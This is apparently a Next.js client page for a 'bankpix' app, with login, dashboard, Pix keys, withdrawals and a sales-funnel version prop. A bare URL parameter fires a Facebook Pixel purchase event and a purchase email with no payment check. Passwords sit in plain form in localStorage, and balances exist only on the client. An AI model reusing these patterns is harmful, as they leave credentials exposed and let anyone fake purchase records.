'use client'

import { useState, useCallback, useEffect, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import { LoginScreen } from '@/components/login-screen'
import { AppSidebar } from '@/components/app-sidebar'
import { DashboardView } from '@/components/dashboard-view'
import { CreateKeyView } from '@/components/create-key-view'
import { MyKeysView } from '@/components/my-keys-view'
import { WithdrawalView } from '@/components/withdrawal-view'
import { AccountMenu } from '@/components/account-menu'
import { type PixKey, type Transaction } from '@/lib/store'
import { supabase } from '@/lib/supabase'

declare global {
  interface Window {
    fbq?: (action: string, event: string, data?: object) => void
  }
}

type View = 'dashboard' | 'create-key' | 'my-keys' | 'withdrawal'

interface UserData {
  name: string
  phone: string
  password: string
  balance: number
  income: number
  keys: PixKey[]
  transactions: Transaction[]
}

// Função auxiliar para salvar no Supabase
async function salvarAcessoNoBanco(nome: string, telefone: string, tipoAcesso: string) {
  try {
    await supabase.from('bankpix_users').insert([
      {
        name: nome,
        phone: telefone,
        access_type: tipoAcesso, // 'VIP' ou 'FREE'
        status: tipoAcesso === 'VIP' ? 'VIP_UNLOCKED' : 'PENDENTE'
      }
    ])
  } catch (error) {
    console.error('Erro ao salvar no banco:', error)
  }
}

function MainApp({ vslVersion = "9" }: { vslVersion?: string }) {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [userName, setUserName] = useState('')
  const [userPhone, setUserPhone] = useState('')
  const [balance, setBalance] = useState(0)
  const [income, setIncome] = useState(0)
  const [keys, setKeys] = useState<PixKey[]>([])
  const [transactions, setTransactions] = useState<Transaction[]>([])
  const [currentView, setCurrentView] = useState<View>('dashboard')
  const [showAccountMenu, setShowAccountMenu] = useState(false)

  // LEITURA DO PARÂMETRO NA URL (?acesso=vip)
  const searchParams = useSearchParams()
  const isUnlocked = searchParams.get('acesso') === 'vip'

  // DISPARO IMEDIATO AO ENTRAR NO LINK VIP (NÃO ESPERA LOGIN)
  useEffect(() => {
    if (isUnlocked) {
      // 1. Dispara o evento de Purchase no Facebook Pixel
      if (typeof window !== 'undefined' && window.fbq) {
        window.fbq('track', 'Purchase', { 
          value: 399, 
          currency: 'MZN' 
        })
      }

      // 2. Dispara a API de e-mail de compra imediatamente
      fetch('/api/send-email', { 
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          user: 'Visitante VIP',
          phone: 'Link Direto VIP',
          accessType: 'VIP_UNLOCKED',
          timestamp: new Date().toISOString()
        })
      }).catch((err) => console.error("Erro ao enviar e-mail:", err))

      // 3. Salva automaticamente o acesso VIP no Supabase
      salvarAcessoNoBanco('Visitante VIP', 'VIP', 'VIP')
    } else {
      // Registra acesso grátis/normal
      salvarAcessoNoBanco('Visitante Grátis', 'Pendente', 'FREE')
    }
  }, [isUnlocked])

  useEffect(() => {
    if (isLoggedIn && userPhone) {
      const userData: UserData = {
        name: userName,
        phone: userPhone,
        password: '',
        balance,
        income,
        keys,
        transactions
      }
      const savedUser = localStorage.getItem(`bankpix_user_${userPhone}`)
      if (savedUser) {
        const existingData = JSON.parse(savedUser)
        userData.password = existingData.password
      }
      localStorage.setItem(`bankpix_user_${userPhone}`, JSON.stringify(userData))
    }
  }, [isLoggedIn, userName, userPhone, balance, income, keys, transactions])

  const handleLogin = useCallback((userData: UserData) => {
    setUserName(userData.name)
    setUserPhone(userData.phone)
    setBalance(userData.balance)
    setIncome(userData.income)
    setKeys(userData.keys || [])
    setTransactions(userData.transactions || [])
    setIsLoggedIn(true)

    // Salva os dados reais do usuário logado no Supabase
    const tipo = isUnlocked ? 'VIP' : 'FREE'
    salvarAcessoNoBanco(userData.name, userData.phone, tipo)
  }, [isUnlocked])

  const handleLogout = useCallback(() => {
    setIsLoggedIn(false)
    setUserName('')
    setUserPhone('')
    setCurrentView('dashboard')
    setKeys([])
    setTransactions([])
    setBalance(0)
    setIncome(0)
    setShowAccountMenu(false)
  }, [])

  const handleNavigate = useCallback((view: View) => {
    setCurrentView(view)
  }, [])

  const handleAddKey = useCallback((key: PixKey) => {
    setKeys(prev => [key, ...prev])
  }, [])

  const handleWithdrawal = useCallback((transaction: Transaction) => {
    setBalance(prev => prev - transaction.amount)
    setTransactions(prev => [transaction, ...prev])
  }, [])

  if (!isLoggedIn) {
    return <LoginScreen onLogin={handleLogin} vslVersion={vslVersion} />
  }

  return (
    <div className="min-h-screen w-full bg-slate-100">
      <AccountMenu
        isOpen={showAccountMenu}
        onClose={() => setShowAccountMenu(false)}
        userName={userName}
        userPhone={userPhone}
      />

      <div className="hidden lg:block">
        <AppSidebar
          currentView={currentView}
          onViewChange={setCurrentView}
          userName={userName}
          userPhone={userPhone}
          onLogout={handleLogout}
          onOpenAccountMenu={() => setShowAccountMenu(true)}
        />
      </div>

      <main className="w-full lg:pl-64 min-h-screen p-0 m-0">
        <div className="w-full p-0 md:p-6 lg:p-8">
          {currentView === 'dashboard' && (
            <DashboardView
              userName={userName}
              balance={balance}
              income={income}
              keys={keys}
              transactions={transactions}
              onNavigate={handleNavigate}
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'create-key' && (
            <CreateKeyView
              userName={userName}
              onAddKey={handleAddKey}
              onBack={() => setCurrentView('dashboard')}
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'my-keys' && (
            <MyKeysView
              keys={keys}
              onCreateKey={() => setCurrentView('create-key')}
              onBack={() => setCurrentView('dashboard')}
            />
          )}

          {currentView === 'withdrawal' && (
            <WithdrawalView
              balance={balance}
              onWithdrawal={handleWithdrawal}
              onBack={() => setCurrentView('dashboard')}
            />
          )}
        </div>
      </main>
    </div>
  )
}

export default function Home(props: { vslVersion?: string }) {
  return (
    <Suspense fallback={<div className="min-h-screen bg-slate-100 flex items-center justify-center">Carregando...</div>}>
      <MainApp {...props} />
    </Suspense>
  )
}
